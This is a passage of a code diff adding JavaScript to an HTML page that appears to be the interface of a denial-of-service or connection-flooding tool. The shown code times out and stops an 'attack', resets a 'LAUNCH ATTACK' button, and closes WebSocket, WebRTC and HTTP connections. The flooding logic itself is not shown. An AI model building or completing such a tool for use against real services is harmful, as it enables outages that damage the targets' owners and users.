+            // Clear any existing timeout to prevent overlapping attacks
+            if (attackTimeout) clearTimeout(attackTimeout);
+            
+            attackTimeout = setTimeout(function() {
+                if (isRunning) {
+                    stopAttack();
+                    btnText.textContent = 'LAUNCH ATTACK';
+                    btn.style.background = 'var(--primary)';
+                    addConsoleLog('[COMPLETE] Attack completed - duration reached');
+                }
+            }, duration);
+        }
+        
+        function stopAttack() {
+            // Stop backend attack if active
+            if (typeof currentAttackId !== 'undefined' && currentAttackId) {
+                stopBackendAttack();
+            }
+
+            isRunning = false;
+            if (attackTimeout) clearTimeout(attackTimeout);
+            
+            activeWorkers = 0;
+            document.getElementById('statusValue').textContent = 'IDLE';
+            document.getElementById('statusValue').classList.remove('warning');
+            document.getElementById('statusValue').classList.add('active');
+            
+            addConsoleLog('[CLEANUP] Closing all connections...');
+            
+            // Close WebSocket connections
+            connections.forEach(function(ws) {
+                try {
+                    if (ws.readyState === WebSocket.OPEN) {
+                        ws.close();
+                    }
+                } catch (error) {
+                    // Ignore close errors
+                }
+            });
+            connections = [];
+            
+            // Close WebRTC connections
+            webRTCConnections.forEach(function(conn) {
+                try {
+                    if (conn.dc.readyState === 'open') {
+                        conn.dc.close();
+                    }
+                    conn.pc.close();
+                } catch (error) {
+                    // Ignore close errors
+                }
+            });
+            webRTCConnections = [];
+            
+            // Clear HTTP connections
+            httpConnections = [];
+            
+            // Clear all intervals
+            if (attackInterval) clearInterval(attackInterval);
+            if (logInterval) clearInterval(logInterval);
+            if (statsInterval) clearInterval(statsInterval);
+            if (detailedLogInterval) clearInterval(detailedLogInterval);
+            
+            addConsoleLog('[CLEANUP] All connections closed. Resources freed.');
+        }
+        
+        // Legacy functions removed - replaced by optimized methods
+    </script>
+</body>
+</html>
